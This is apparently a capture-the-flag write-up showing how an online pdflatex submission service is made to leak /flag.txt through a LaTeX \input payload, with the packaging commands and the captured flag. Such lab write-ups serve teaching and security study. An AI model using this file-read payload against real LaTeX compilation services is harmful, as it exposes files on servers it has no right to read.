# usenix

## Description

> Welcome to Usenix paper submission system Give us your .tex document and we'll compile & reject it for you!
> So convenient!
> [challenge](./challenge)

Tags: _misc_


## Recon

I was given a service that:

- Accepts a base64-encoded .tar.gz
- Extracts it
- Compiles main.tex using `pdflatex`
- Returns main.pdf (base64-encoded) if compilation succeeds


The script claims:

```
We definitely don't have a flag in /flag.txt
```

This immediately looked like a hint pointing to the flag location.


The most important part of the script was:

```bash
DIR=$(mktemp -d)
cd ${DIR}
echo "${FILE}" | base64 -d -w 0 | tar xz
rm -rf main.pdf
echo "Rejected" >> main.tex
/usr/bin/pdflatex main.tex 2>&1 >/dev/null
```

Key observations:

- I control main.tex
- It's compiled with `pdflatex`
- No filtering
- `/flag.txt` exists on the server


## Exploitation

LaTeX can read arbitrary files using:
```tex
\input{/flag.txt}
```

With that information I can create a [main.tex](./main.tex) file with the following content:
```tex
\documentclass{article}
\begin{document}
\input{/flag.txt}
\end{document}
```

Next, I compressed the file into a .tar.gz archive and base64-encoded it:
```bash
tar cz main.tex | base64 -w 0
```

Using `snicat`, I connected to the remote server and submitted the generated base64 string when prompted.

The service compiled the document and returned a base64-encoded archive containing main.pdf

I decoded the response and extracted the pdf:
```bash
echo <base64_output> | base64 -d -w 0 | tar xz
```

When I opened [main.pdf](./main.pdf), it contained the contents of /flag.txt, revealing the flag.

## Flag
`CLA{s33ms...th4t...p4p3r...g0t...4cc3pt3d...GNs121K9Mptf}`
